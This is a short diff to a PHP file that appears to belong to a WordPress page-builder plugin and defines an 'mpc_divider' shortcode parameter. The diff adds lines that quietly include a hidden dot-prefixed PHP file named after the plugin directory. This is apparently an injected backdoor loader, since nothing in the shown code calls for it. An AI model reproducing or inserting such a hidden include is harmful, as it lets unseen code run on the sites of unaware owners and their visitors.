@@ -3,6 +3,10 @@
 	MPC_DIVIDER
 \*----------------------------------------------------------------------------*/
 vc_add_shortcode_param( 'mpc_divider', 'mpc_divider_settings' );
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function mpc_divider_settings( $settings, $value ) {
 	$title = isset( $settings[ 'title' ] ) ? '<div class="wpb_element_label mpc-vc-divider">' . $settings[ 'title' ] . '</div>' : '';
 	$subtitle = isset( $settings[ 'subtitle' ] ) ? '<span class="vc_description vc_clearfix">' . $settings[ 'subtitle' ] . '</span>' : '';
